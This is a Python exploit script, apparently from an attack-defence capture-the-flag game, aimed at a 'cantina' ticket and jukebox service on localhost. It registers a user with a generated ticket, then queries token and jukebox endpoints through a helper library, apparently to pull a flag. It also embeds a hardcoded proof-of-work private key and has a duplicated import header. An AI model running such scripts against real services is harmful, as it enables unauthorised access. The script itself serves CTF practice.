#!/usr/bin/python

import base64
import yaml
import json
import cantina
import httpx
import asyncio
import os
import random

from cantina.powcheck import powcheck
from cantina.tocan import ToCanClient
from cantina.tocan.message import *
from cantina.canopy.fields import Session
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305


POW_HARDNESS = 21
POW_PRIVATE_KEY = "+FhWjbCble523/+m/0VPVxMfxScN36+gYQM5aogpS3I="
CONF_DIR = '../../src/conf'


#!/usr/bin/env python3

#import hashlib
import logging
#import socket
from typing import Tuple
import asyncio
from random import randint
from time import sleep
import os
import httpx
import secrets
import base64
import io

from cantinautils import orderflow

from pathlib import Path



class Exploit():
    def __init__(self, ip: str):
        self.ip = ip
        self.gw_port = 10020 #10020
        self.pos_port = 10021
        self.juk_port = 10024
        self.timeout = 5  # don't forget to set a timeout for every requests you send
        self.flagsecret = "CHANGEME"  # secret string used to derive credentials (username, password, ...)
        self.baseurl_ticket = f"http://{self.ip}:{self.pos_port}"
        self.baseurl_juke = f"http://{self.ip}:{self.juk_port}"
        

        self.bot_privkey = os.environ.get(
        "POW_PRIVATE_KEY",
        "+FhWjbCble523/+m/0VPVxMfxScN36+gYQM5aogpS3I=",
    )

    async def create_user(self, username):
        async with httpx.AsyncClient() as c:
            #TODO Better Usernames
            ticket = await self.get_ticket()
            resp = await c.post(f'{self.baseurl_juke}/register', json={'Ticket':ticket, 'User':username})
            data = resp.json()
            if resp.status_code != 201:
                raise Exception("Ticket invalid")
            
            logging.info(data)
            uid = data[0]
            username = data[2]
            authtoken = data[3]
            return dict(username=username, authtoken=authtoken)

    async def get_ticket(self):
        ticket_info = None
        ticket_info = await orderflow.get_ticket_async(self.baseurl_ticket, self.bot_privkey, False)
        logging.warning(ticket_info)
        return ticket_info

    async def run(self):

        # Username 28 bytes max
        username = secrets.token_hex(12)

        userinfo = await  self.create_user(username)

        username = userinfo['username']
        authtoken = userinfo['authtoken']
        print(userinfo)

        ticket = await self.get_ticket()
        result = await orderflow.query_token(self.ip, self.gw_port, username, authtoken, ticket)
        
        ticket = await self.get_ticket()
        print(result[0])
        result = await orderflow.query_jukebox(self.ip, self.gw_port, username, authtoken, ticket, result[0])
        print(result)
        


if __name__ == "__main__":

    base_url = "http://localhost:10021"
#    info = asyncio.run(
#        place_order(
#            base_url, "FLG_YEEEEEEHAAAAAAAAAAAAAAAAAAAWWWWWWWWWW", False
#        )
#    )
#    print("That's all, folks", info)

    exp = Exploit('localhost')
    info = asyncio.run(exp.run())
